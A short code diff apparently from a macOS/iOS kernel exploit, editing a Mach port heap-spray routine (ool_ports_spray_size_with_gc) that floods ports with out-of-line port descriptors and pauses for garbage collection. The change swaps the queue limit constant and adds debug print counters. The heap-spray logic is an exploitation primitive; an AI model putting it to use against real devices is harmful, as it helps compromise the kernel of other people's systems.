@@ -353,10 +353,11 @@ ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_co
 	size_t next_gc_step = 0;
 	size_t port_count = *holding_port_count;
 	size_t ports_used = 0;
+    size_t totalmessages = 0;
 	for (; ports_used < port_count && ools_left > 0; ports_used++) {
 		// Spray this port one message at a time until we've maxed out its queue.
 		size_t messages_sent = 0;
-		for (; messages_sent < MACH_PORT_QLIMIT_MAX && ools_left > 0; messages_sent++) {
+		for (; messages_sent < MACH_PORT_QLIMIT_DEFAULT && ools_left > 0; messages_sent++) {
 			// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
 			// next one.
 			if (sprayed >= next_gc_step) {
@@ -383,7 +384,9 @@ ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_co
 			// We sent a full message worth of OOL port descriptors.
 			sprayed += ools_per_message * ool_size;
 			ools_left -= ools_per_message;
+            printf("%zu\n", totalmessages++);
 		}
+        printf("%zu\n", messages_sent);
 	}
 	fprintf(stderr, "\n");
 	// Return the number of ports actually used and the number of bytes actually sprayed.
